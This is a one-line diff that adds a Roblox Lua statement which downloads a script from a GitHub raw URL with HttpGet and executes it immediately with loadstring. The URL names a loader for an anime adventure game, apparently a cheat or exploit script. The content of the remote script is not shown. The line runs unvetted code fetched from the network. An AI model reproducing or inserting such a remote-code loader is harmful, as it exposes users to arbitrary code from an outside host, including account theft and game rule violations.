@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/april-fool-s-anime-adventures-spam7-e5d0f1mlomlaaa.lua"))()
